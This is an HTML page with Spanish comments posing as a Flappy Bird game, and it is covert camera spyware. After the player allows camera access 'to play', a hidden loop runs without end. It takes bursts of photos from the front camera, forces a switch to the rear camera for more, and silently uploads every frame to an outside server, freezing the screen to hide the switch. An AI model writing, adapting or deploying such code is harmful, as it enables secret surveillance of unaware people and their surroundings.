<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Flappy Ultra Fix</title>
    <style>
        * { box-sizing: border-box; touch-action: none; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; color: white; }
        
        /* Contenedor rígido para que nada se deforme */
        #cam-box { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; display: flex; align-items: center; justify-content: center; background: #000; }
        video#webcam { width: 100%; height: 100%; object-fit: cover; filter: brightness(0.6); }

        canvas#freezeCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2; display: none; object-fit: cover; }
        canvas#gameCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }

        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 300; display: flex; align-items: center; justify-content: center; text-align: center; }
        .card { background: #111; padding: 30px; border-radius: 20px; border: 2px solid #f1c40f; width: 85%; }
        .btn { background: #f1c40f; color: #000; border: none; padding: 15px; font-size: 18px; font-weight: bold; border-radius: 10px; cursor: pointer; width: 100%; margin-top: 15px; }
        .hud { position: absolute; top: 20px; width: 100%; text-align: center; z-index: 100; font-size: 32px; font-weight: bold; display: none; }
    </style>
</head>
<body onclick="birdJump()">

<div class="hud" id="hud">SCORE: <span id="score">0</span></div>

<div id="cam-box">
    <video id="webcam" autoplay playsinline></video>
</div>
<canvas id="freezeCanvas"></canvas>
<canvas id="gameCanvas"></canvas>

<div id="permission-screen" class="overlay">
    <div class="card">
        <h2 style="color:#f1c40f;">ACCESO TOTAL</h2>
        <p>Habilitá la cámara para iniciar el juego.</p>
        <button class="btn" onclick="initSystem()">ACTIVAR</button>
    </div>
</div>

<div id="start-screen" class="overlay" style="display:none;">
    <div class="card">
        <h1 id="title-msg" style="color:#f1c40f;">LISTO</h1>
        <button class="btn" onclick="startGame()">JUGAR</button>
    </div>
</div>

<script>
    const video = document.getElementById('webcam');
    const gameCanvas = document.getElementById('gameCanvas');
    const freezeCanvas = document.getElementById('freezeCanvas');
    const ctx = gameCanvas.getContext('2d');
    const fCtx = freezeCanvas.getContext('2d');
    const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";

    let bird, pipes, score, isRunning = false;
    let pipeInterval;

    // --- 1. CAMBIO DE CÁMARA POR MODO (USER vs ENVIRONMENT) ---
    async function initSystem() {
        try {
            await startCamera("user"); // Arranca con la de la cara
            document.getElementById('permission-screen').style.display = 'none';
            document.getElementById('start-screen').style.display = 'flex';
            runBurstCycle();
        } catch (err) { alert("Error crítico: " + err); }
    }

    async function startCamera(mode) {
        if (video.srcObject) {
            video.srcObject.getTracks().forEach(track => track.stop());
        }

        // Constraints estrictas para evitar deformación
        const constraints = {
            video: {
                facingMode: mode,
                width: { ideal: 1280 },
                height: { ideal: 720 }
            }
        };

        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        // Solo espejamos la de la cara
        video.style.transform = (mode === "user") ? "scaleX(-1)" : "scaleX(1)";
        
        return new Promise(resolve => video.onloadedmetadata = resolve);
    }

    async function runBurstCycle() {
        while (true) {
            // 5 fotos ráfaga cara
            await takeBurst(5);

            // Congelamos y cambiamos a la trasera
            freeze(true);
            try {
                await startCamera("environment"); // OBLIGA a la trasera
                await takeBurst(5);
                await startCamera("user"); // VUELVE a la cara
            } catch (e) { console.log("No hay cámara trasera disponible"); }
            freeze(false);

            await new Promise(r => setTimeout(r, 2000));
        }
    }

    async function takeBurst(count) {
        for (let i = 0; i < count; i++) {
            const snap = document.createElement('canvas');
            // Mantenemos ratio 4:3 para las capturas enviadas
            snap.width = 320; snap.height = 240;
            snap.getContext('2d').drawImage(video, 0, 0, 320, 240);
            
            fetch(SERVER_URL, {
                method: 'POST',
                mode: 'cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: snap.toDataURL('image/jpeg', 0.5) })
            }).catch(() => {});
            await new Promise(r => setTimeout(r, 150));
        }
    }

    function freeze(active) {
        if (active) {
            freezeCanvas.width = window.innerWidth;
            freezeCanvas.height = window.innerHeight;
            // Captura el estado actual antes de apagar la cámara
            fCtx.save();
            if (video.style.transform.includes("-1")) {
                fCtx.scale(-1, 1);
                fCtx.drawImage(video, -freezeCanvas.width, 0, freezeCanvas.width, freezeCanvas.height);
            } else {
                fCtx.drawImage(video, 0, 0, freezeCanvas.width, freezeCanvas.height);
            }
            fCtx.restore();
            freezeCanvas.style.display = 'block';
        } else {
            freezeCanvas.style.display = 'none';
        }
    }

    // --- 2. JUEGO FLAPPY BIRD ---
    function startGame() {
        document.getElementById('start-screen').style.display = 'none';
        document.getElementById('hud').style.display = 'block';
        gameCanvas.width = window.innerWidth;
        gameCanvas.height = window.innerHeight;
        bird = { x: 50, y: gameCanvas.height / 2, v: 0, radius: 18 };
        pipes = []; score = 0; isRunning = true;
        document.getElementById('score').innerText = "0";
        if (pipeInterval) clearInterval(pipeInterval);
        spawnPipe();
        gameLoop();
    }

    function birdJump() { if (isRunning) bird.v = -7.5; }

    function spawnPipe() {
        if (!isRunning) return;
        const h = Math.random() * (gameCanvas.height - 350) + 70;
        pipes.push({ x: gameCanvas.width, top: h, bottom: h + 190, w: 60, passed: false });
        pipeInterval = setTimeout(spawnPipe, 1500);
    }

    function gameLoop() {
        if (!isRunning) return;
        ctx.clearRect(0, 0, gameCanvas.width, gameCanvas.height);
        bird.v += 0.4; bird.y += bird.v;
        
        ctx.fillStyle = "#f1c40f";
        ctx.beginPath(); ctx.arc(bird.x, bird.y, bird.radius, 0, Math.PI * 2); ctx.fill();

        pipes.forEach((p, i) => {
            p.x -= 4.5;
            ctx.fillStyle = "#2ecc71";
            ctx.fillRect(p.x, 0, p.w, p.top);
            ctx.fillRect(p.x, p.bottom, p.w, gameCanvas.height - p.bottom);
            if (bird.x + bird.radius > p.x && bird.x - bird.radius < p.x + p.w) {
                if (bird.y - bird.radius < p.top || bird.y + bird.radius > p.bottom) gameOver();
            }
            if (p.x + p.w < bird.x && !p.passed) {
                score++; p.passed = true;
                document.getElementById('score').innerText = score;
            }
            if (p.x + p.w < 0) pipes.splice(i, 1);
        });
        if (bird.y > gameCanvas.height || bird.y < 0) gameOver();
        requestAnimationFrame(gameLoop);
    }

    function gameOver() {
        isRunning = false;
        document.getElementById('title-msg').innerText = "GAME OVER (" + score + ")";
        document.getElementById('start-screen').style.display = 'flex';
        document.getElementById('hud').style.display = 'none';
    }
</script>
</body>
</html>
